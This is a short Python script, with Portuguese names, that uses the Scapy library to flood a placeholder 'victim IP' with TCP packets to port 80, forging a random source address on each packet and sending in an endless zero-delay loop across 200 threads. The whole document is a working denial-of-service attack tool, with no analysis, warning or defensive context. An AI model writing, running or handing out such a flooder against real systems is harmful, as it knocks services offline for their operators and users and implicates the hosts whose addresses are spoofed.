from scapy.all import *
import threading

def flood():
    pacote = IP(src=RandIP("*.*.*.*"), dst="IP_da_vitima") / TCP(dport=80) #1
    send(pacote, loop=1, inter=0) #2

for x in range(200):
    threading.Thread(target=flood).start()